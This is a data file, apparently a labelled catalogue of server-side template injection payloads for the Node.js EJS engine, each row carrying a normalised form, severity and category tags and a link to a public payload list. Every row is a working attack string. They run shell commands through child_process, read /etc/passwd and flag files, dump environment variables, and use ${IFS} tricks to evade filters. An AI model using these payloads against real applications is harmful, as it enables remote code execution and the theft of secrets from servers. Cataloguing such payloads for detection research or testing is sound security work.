"<%= process.binding('spawn_sync').spawn({file:'/bin/sh',args:['/bin/sh','-c','id'],stdio:[{type:'pipe',readable:1,writable:1}]}).output[1].toString() %>","<%=process.binding('S').spawn({file:'S',args:['S','S','S'],stdio:[{type:'S',readable:N,writable:N}]}).output[N].tostring()%>",javascript,EJS,1,high,direct-execution,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
"<%= process.binding('spawn_sync').spawn({file:'/bin/sh',args:['/bin/sh','-c','whoami'],stdio:[{type:'pipe',readable:1,writable:1}]}).output[1].toString() %>","<%=process.binding('S').spawn({file:'S',args:['S','S','S'],stdio:[{type:'S',readable:N,writable:N}]}).output[N].tostring()%>",javascript,EJS,1,high,direct-execution,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
"<%= process.binding('spawn_sync').spawn({file:'/bin/sh',args:['/bin/sh','-c','cat /etc/passwd'],stdio:[{type:'pipe',readable:1,writable:1}]}).output[1].toString() %>","<%=process.binding('S').spawn({file:'S',args:['S','S','S'],stdio:[{type:'S',readable:N,writable:N}]}).output[N].tostring()%>",javascript,EJS,1,high,direct-execution,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
"<%= process.binding('spawn_sync').spawn({file:'/bin/sh',args:['/bin/sh','-c','ls -la'],stdio:[{type:'pipe',readable:1,writable:1}]}).output[1].toString() %>","<%=process.binding('S').spawn({file:'S',args:['S','S','S'],stdio:[{type:'S',readable:N,writable:N}]}).output[N].tostring()%>",javascript,EJS,1,high,direct-execution,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.env %>,<%=process.env%>,javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.env.PATH %>,<%=process.env.path%>,javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.env.HOME %>,<%=process.env.home%>,javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.env.USER %>,<%=process.env.user%>,javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.env.SHELL %>,<%=process.env.shell%>,javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.version %>,<%=process.version%>,javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.versions %>,<%=process.versions%>,javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.platform %>,<%=process.platform%>,javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.arch %>,<%=process.arch%>,javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.release %>,<%=process.release%>,javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.config %>,<%=process.config%>,javascript,EJS,1,high,enumeration,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.pid %>,<%=process.pid%>,javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.ppid %>,<%=process.ppid%>,javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.cwd() %>,<%=process.cwd()%>,javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.execPath %>,<%=process.execpath%>,javascript,EJS,1,high,direct-execution,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.argv %>,<%=process.argv%>,javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.execArgv %>,<%=process.execargv%>,javascript,EJS,1,high,direct-execution,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.memoryUsage() %>,<%=process.memoryusage()%>,javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.uptime() %>,<%=process.uptime()%>,javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= global.process.env %>,<%=global.process.env%>,javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= global.process.version %>,<%=global.process.version%>,javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= global.process.platform %>,<%=global.process.platform%>,javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= global.process.cwd() %>,<%=global.process.cwd()%>,javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
"<%= process.mainModule.require('fs').readFileSync('/etc/passwd','utf8') %>","<%=process.mainmodule.require('S').readfilesync('S','S')%>",javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
"<%= process.mainModule.require('fs').readFileSync('flag.txt','utf8') %>","<%=process.mainmodule.require('S').readfilesync('S','S')%>",javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('fs').readdirSync('/') %>,<%=process.mainmodule.require('S').readdirsync('S')%>,javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('fs').readdirSync('.') %>,<%=process.mainmodule.require('S').readdirsync('S')%>,javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('fs').existsSync('/etc/passwd') %>,<%=process.mainmodule.require('S').existssync('S')%>,javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('fs').statSync('/etc/passwd') %>,<%=process.mainmodule.require('S').statsync('S')%>,javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
"<%= global.process.mainModule.require('fs').readFileSync('/etc/passwd','utf8') %>","<%=global.process.mainmodule.require('S').readfilesync('S','S')%>",javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
"<%= global.process.mainModule.require('fs').readFileSync('flag.txt','utf8') %>","<%=global.process.mainmodule.require('S').readfilesync('S','S')%>",javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= global.process.mainModule.require('fs').readdirSync('/') %>,<%=global.process.mainmodule.require('S').readdirsync('S')%>,javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.constructor._load('child_process').execSync('id').toString() %>,<%=process.mainmodule.constructor._load('S').execsync('S').tostring()%>,javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.constructor._load('child_process').execSync('whoami').toString() %>,<%=process.mainmodule.constructor._load('S').execsync('S').tostring()%>,javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.constructor._load('child_process').execSync('cat /etc/passwd').toString() %>,<%=process.mainmodule.constructor._load('S').execsync('S').tostring()%>,javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.constructor._load('child_process').execSync('ls -la').toString() %>,<%=process.mainmodule.constructor._load('S').execsync('S').tostring()%>,javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.constructor._load('child_process').execSync('uname -a').toString() %>,<%=process.mainmodule.constructor._load('S').execsync('S').tostring()%>,javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
"<%= process.mainModule.constructor._load('fs').readFileSync('/etc/passwd','utf8') %>","<%=process.mainmodule.constructor._load('S').readfilesync('S','S')%>",javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
"<%= process.mainModule.constructor._load('fs').readFileSync('flag.txt','utf8') %>","<%=process.mainmodule.constructor._load('S').readfilesync('S','S')%>",javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.constructor._load('fs').readdirSync('/') %>,<%=process.mainmodule.constructor._load('S').readdirsync('S')%>,javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('child_process').spawn('id') %>,<%=process.mainmodule.require('S').spawn('S')%>,javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('child_process').spawn('whoami') %>,<%=process.mainmodule.require('S').spawn('S')%>,javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
"<%= process.mainModule.require('child_process').spawn('cat',['/etc/passwd']) %>","<%=process.mainmodule.require('S').spawn('S',['S'])%>",javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
"<%= process.mainModule.require('child_process').spawn('ls',['-la']) %>","<%=process.mainmodule.require('S').spawn('S',['S'])%>",javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('os').hostname() %>,<%=process.mainmodule.require('S').hostname()%>,javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('os').type() %>,<%=process.mainmodule.require('S').type()%>,javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('os').platform() %>,<%=process.mainmodule.require('S').platform()%>,javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('os').arch() %>,<%=process.mainmodule.require('S').arch()%>,javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('os').release() %>,<%=process.mainmodule.require('S').release()%>,javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('os').uptime() %>,<%=process.mainmodule.require('S').uptime()%>,javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('os').loadavg() %>,<%=process.mainmodule.require('S').loadavg()%>,javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('os').totalmem() %>,<%=process.mainmodule.require('S').totalmem()%>,javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('os').freemem() %>,<%=process.mainmodule.require('S').freemem()%>,javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('os').cpus() %>,<%=process.mainmodule.require('S').cpus()%>,javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('os').networkInterfaces() %>,<%=process.mainmodule.require('S').networkinterfaces()%>,javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('os').userInfo() %>,<%=process.mainmodule.require('S').userinfo()%>,javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('os').homedir() %>,<%=process.mainmodule.require('S').homedir()%>,javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('os').tmpdir() %>,<%=process.mainmodule.require('S').tmpdir()%>,javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= require('child_process').execSync('id').toString() %>,<%=require('S').execsync('S').tostring()%>,javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= require('child_process').execSync('whoami').toString() %>,<%=require('S').execsync('S').tostring()%>,javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= require('child_process').execSync('cat /etc/passwd').toString() %>,<%=require('S').execsync('S').tostring()%>,javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= require('child_process').execSync('ls -la').toString() %>,<%=require('S').execsync('S').tostring()%>,javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= require('child_process').execSync('uname -a').toString() %>,<%=require('S').execsync('S').tostring()%>,javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= require('child_process').execSync('pwd').toString() %>,<%=require('S').execsync('S').tostring()%>,javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= require('child_process').execSync('env').toString() %>,<%=require('S').execsync('S').tostring()%>,javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= require('child_process').execSync('cat flag.txt').toString() %>,<%=require('S').execsync('S').tostring()%>,javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= require('child_process').exec('id') %>,<%=require('S').exec('S')%>,javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= require('child_process').exec('whoami') %>,<%=require('S').exec('S')%>,javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= require('child_process').exec('cat /etc/passwd') %>,<%=require('S').exec('S')%>,javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
"<%= require('fs').readFileSync('/etc/passwd','utf8') %>","<%=require('S').readfilesync('S','S')%>",javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
"<%= require('fs').readFileSync('flag.txt','utf8') %>","<%=require('S').readfilesync('S','S')%>",javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= require('fs').readdirSync('/') %>,<%=require('S').readdirsync('S')%>,javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= require('fs').readdirSync('.') %>,<%=require('S').readdirsync('S')%>,javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= require('os').hostname() %>,<%=require('S').hostname()%>,javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= require('os').userInfo() %>,<%=require('S').userinfo()%>,javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= require('os').networkInterfaces() %>,<%=require('S').networkinterfaces()%>,javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%- process.mainModule.require('child_process').execSync('id').toString() %>,<%-process.mainmodule.require('S').execsync('S').tostring()%>,javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%- process.mainModule.require('child_process').execSync('whoami').toString() %>,<%-process.mainmodule.require('S').execsync('S').tostring()%>,javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%- process.mainModule.require('child_process').execSync('cat /etc/passwd').toString() %>,<%-process.mainmodule.require('S').execsync('S').tostring()%>,javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%- process.mainModule.require('child_process').execSync('ls -la').toString() %>,<%-process.mainmodule.require('S').execsync('S').tostring()%>,javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
"<%- process.mainModule.require('fs').readFileSync('/etc/passwd','utf8') %>","<%-process.mainmodule.require('S').readfilesync('S','S')%>",javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
"<%- process.mainModule.require('fs').readFileSync('flag.txt','utf8') %>","<%-process.mainmodule.require('S').readfilesync('S','S')%>",javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%- global.process.mainModule.require('child_process').execSync('id').toString() %>,<%-global.process.mainmodule.require('S').execsync('S').tostring()%>,javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%- global.process.mainModule.require('child_process').execSync('whoami').toString() %>,<%-global.process.mainmodule.require('S').execsync('S').tostring()%>,javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%- require('child_process').execSync('id').toString() %>,<%-require('S').execsync('S').tostring()%>,javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%- require('child_process').execSync('whoami').toString() %>,<%-require('S').execsync('S').tostring()%>,javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
"<%- require('fs').readFileSync('/etc/passwd','utf8') %>","<%-require('S').readfilesync('S','S')%>",javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<% var x = process.mainModule.require('child_process').execSync('id').toString(); %><%=x%>,<%varx=process.mainmodule.require('S').execsync('S').tostring();%><%=x%>,javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<% var x = process.mainModule.require('child_process').execSync('whoami').toString(); %><%=x%>,<%varx=process.mainmodule.require('S').execsync('S').tostring();%><%=x%>,javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<% var x = process.mainModule.require('child_process').execSync('cat /etc/passwd').toString(); %><%=x%>,<%varx=process.mainmodule.require('S').execsync('S').tostring();%><%=x%>,javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
"<% var x = process.mainModule.require('fs').readFileSync('/etc/passwd','utf8'); %><%=x%>","<%varx=process.mainmodule.require('S').readfilesync('S','S');%><%=x%>",javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
"<% var x = process.mainModule.require('fs').readFileSync('flag.txt','utf8'); %><%=x%>","<%varx=process.mainmodule.require('S').readfilesync('S','S');%><%=x%>",javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('child_process').execSync('cat${IFS}/etc/passwd').toString() %>,<%=process.mainmodule.require('S').execsync('S').tostring()%>,javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('child_process').execSync('cat$IFS/etc/passwd').toString() %>,<%=process.mainmodule.require('S').execsync('S').tostring()%>,javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
